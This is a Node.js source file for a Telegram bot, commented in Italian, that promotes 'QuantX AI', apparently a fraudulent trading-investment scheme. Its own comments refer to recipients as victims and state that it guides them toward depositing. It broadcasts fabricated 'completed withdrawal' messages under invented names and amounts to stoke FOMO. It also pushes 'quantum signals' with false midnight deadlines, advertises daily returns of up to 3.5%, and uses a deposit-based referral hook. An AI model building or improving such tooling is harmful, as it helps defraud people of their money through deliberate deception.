// QuantX AI - Bot Telegram: leva di engagement + acquisizione + prova sociale fake
// Funzioni: push segnali 9/17/21, auto-benvenuto con link ref, comandi, "prelievi live" simulati
// Uso: imposta TELEGRAM_BOT_TOKEN, APP_URL, REF_CODE poi `npm run bot`
const fs = require('fs');
const path = require('path');

const TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const APP_URL = process.env.APP_URL || 'https://quantx-ai.top/app.html';
const REF_CODE = process.env.REF_CODE || ''; // il tuo codice referale per guadagnare dagli inviti
const CHATS_FILE = path.join(__dirname, 'data', 'telegram_chats.json');

const chats = fs.existsSync(CHATS_FILE)
  ? JSON.parse(fs.readFileSync(CHATS_FILE, 'utf8'))
  : [];

// ------- Prova sociale: "prelievi" fake rotanti per creare FOMO -------
const FAKES = [
  { n: 'Marco B.', c: 'Milano', a: 247.50 }, { n: 'Giulia R.', c: 'Roma', a: 183.20 },
  { n: 'Antonio F.', c: 'Napoli', a: 312.80 }, { n: 'Elena M.', c: 'Torino', a: 156.40 },
  { n: 'Luca V.', c: 'Bologna', a: 428.90 }, { n: 'Sara P.', c: 'Firenze', a: 198.60 },
  { n: 'Davide C.', c: 'Verona', a: 275.30 }, { n: 'Martina G.', c: 'Padova', a: 164.10 },
  { n: 'Francesco L.', c: 'Genova', a: 389.70 }, { n: 'Chiara T.', c: 'Bari', a: 221.50 },
];
function fakePayout() {
  const f = FAKES[Math.floor(Math.random() * FAKES.length)];
  return `🎉 *PRELIEVO COMPLETATO*\n\n${f.n} (${f.c}) ha appena prelevato *€${f.a.toFixed(2)}* ⚡\n\nIl motore quantistico non si ferma. Vuoi il prossimo segnale?\n\n👉 ${APP_URL}`;
}

async function tg(method, body) {
  const r = await fetch(`https://api.telegram.org/bot${TOKEN}/${method}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  return r.json();
}

function signalMessage() {
  const hour = new Date().getHours();
  const n = hour < 9 ? 1 : hour < 17 ? 2 : 3;
  return (
    `⚡ *QUANTX AI — Segnale Quantistico #${n}* ⚡\n\n` +
    `🧠 Il motore ha identificato un'opportunità ad alta confidenza.\n` +
    `📈 Profittabilità stimata: +${(0.6 + Math.random() * 1.2).toFixed(2)}%\n\n` +
    `⚠️ Questo segnale *scade a mezzanotte*. Se non lo attivi oggi, la giocata è persa.\n\n` +
    `👉 Attiva ora: ${APP_URL}${REF_CODE ? `?ref=${REF_CODE}` : ''}`
  );
}

async function pushToAll(text, mode) {
  for (const chatId of chats) {
    await tg('sendMessage', { chat_id: chatId, text, parse_mode: mode || 'Markdown' });
    await new Promise(r => setTimeout(r, 1200)); // anti-rate-limit
  }
}

async function pushSignals() {
  if (!chats.length) return console.log('Nessuna chat registrata.');
  await pushToAll(signalMessage());
  console.log(`[${new Date().toISOString()}] Segnali spinti a ${chats.length} utenti`);
}

// Comandi del bot: guida la vittima verso il deposito
async function handleCommand(chatId, cmd) {
  const link = `${APP_URL}${REF_CODE ? `?ref=${REF_CODE}` : ''}`;
  switch (cmd) {
    case '/segnali':
      return `⚡ *I tuoi segnali quantistici*\n\nOgni giorno 3 segnali esclusivi: ore 09, 17 e 21.\nAttivali TUTTI per massimizzare il profitto.\n\n👉 ${link}`;
    case '/piani':
      return `📊 *I piani QuantX*\n\n💠 STARTER €10 — +1,2%/giorno\n🚬 SILVER €50 — +1,8%/giorno ⭐\n🥇 GOLD €200 — +2,5%/giorno\n⚡ TITAN €500 — +3,5%/giorno\n\n⚠️ *Ultimo round di onboarding: posti limitati.*\n\n👉 Scegli il tuo piano: ${link}`;
    case '/referral':
      return `🤝 *Programma Fedeltà*\n\nInvita amici e incassa fino al *15% su ogni loro deposito*. A vita.\n\n👉 Attiva e invita: ${link}`;
    case '/prelievi':
      return `💸 *Prelievi*\n\nI prelievi sotto €20 vengono approvati *istantaneamente*. Per importi superiori serve la verifica KYC.\n\n👉 Accedi al pannello: ${link}`;
    default:
      return null;
  }
}

async function main() {
  if (!TOKEN) {
    console.log('Imposta TELEGRAM_BOT_TOKEN per partire.');
    process.exit(1);
  }
  const me = await tg('getMe');
  console.log(`Bot attivo: @${me.result.username} — ${chats.length} chat registrate`);

  const lastUpdate = { id: 0 };
  setInterval(async () => {
    const up = await tg('getUpdates', { offset: lastUpdate.id + 1, timeout: 1 });
    for (const u of up.result) {
      lastUpdate.id = u.update_id;
      const chatId = u.message?.chat?.id;
      const text = u.message?.text || '';
      if (!chatId) continue;
      const isNew = !chats.includes(chatId);
      if (isNew) {
        chats.push(chatId);
        fs.writeFileSync(CHATS_FILE, JSON.stringify(chats, null, 2));
        const link = `${APP_URL}${REF_CODE ? `?ref=${REF_CODE}` : ''}`;
        await tg('sendMessage', {
          chat_id: chatId, parse_mode: 'Markdown',
          text: `⚡ *Benvenuto su QuantX AI*\n\nOgni giorno ricevi 3 segnali quantistici esclusivi (09:00 / 17:00 / 21:00). Attivali tutti e 3 o perdi il profitto.\n\n📊 *Posti limitati per il prossimo ciclo — entra subito:*\n${link}\n\nComandi:\n/segnali — i tuoi segnali\n/piani — piani e rendimenti\n/referral — guadagna invitando amici`,
        });
        console.log(`[+] Nuova vittima acquisita: ${chatId} (totale: ${chats.length})`);
      }
      if (text.startsWith('/')) {
        const reply = await handleCommand(chatId, text.split(' ')[0]);
        if (reply) await tg('sendMessage', { chat_id: chatId, text: reply, parse_mode: 'Markdown' });
      }
    }
  }, 5000);

  // Push segnali 9/17/21 + "prelievi live" fake ogni ~45min per FOMO
  setInterval(async () => {
    const h = new Date().getHours();
    if ([9, 17, 21].includes(h)) await pushSignals();
  }, 60000);
  setInterval(async () => {
    if (!chats.length) return;
    await pushToAll(fakePayout());
    console.log(`[${new Date().toISOString()}] Prelevi fake spinti`);
  }, 45 * 60 * 1000);
}

main().catch(console.error);
